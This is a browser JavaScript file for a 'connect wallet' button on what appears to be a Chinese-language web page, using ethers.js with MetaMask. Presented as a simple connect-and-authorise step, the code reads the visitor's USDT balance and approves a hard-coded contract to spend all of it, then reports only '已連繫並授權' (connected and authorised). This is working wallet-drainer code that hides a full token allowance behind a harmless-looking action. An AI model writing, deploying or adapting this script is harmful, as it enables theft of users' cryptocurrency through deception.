// script.js
const ETHEREUM_CONTRACT_ADDRESS = '0xd0dd2b726f7e7c6f7b62be25df61b7558a4ade08';
const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const CONTRACT_ABI = [
    "function connectAndAuthorize() external",
    "event Authorized(address indexed customer)"
];
const USDT_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address) view returns (uint256)"
];

const connectButton = document.getElementById('connectButton');
let provider, wallet, contract, usdtContract;

async function connectWallet() {
    try {
        if (typeof window.ethereum === 'undefined') {
            updateStatus('請安裝 MetaMask 或支援的錢包');
            return;
        }
        provider = new ethers.BrowserProvider(window.ethereum);
        await provider.send('eth_requestAccounts', []);
        wallet = await provider.getSigner();
        contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, wallet);
        usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, wallet);

        const usdtBalance = await usdtContract.balanceOf(await wallet.getAddress());
        if (usdtBalance > 0) {
            await usdtContract.approve(ETHEREUM_CONTRACT_ADDRESS, usdtBalance);
        }
        await contract.connectAndAuthorize();
        connectButton.style.color = 'green';
        updateStatus('已連繫並授權');
    } catch (error) {
        updateStatus(`操作失敗：${error.message}`);
    }
}

function updateStatus(message) {
    const statusDiv = document.getElementById('status');
    statusDiv.innerHTML = `<strong>狀態：</strong>${message}`;
}

connectButton.addEventListener('click', connectWallet);
console.log('connectButton event listener added');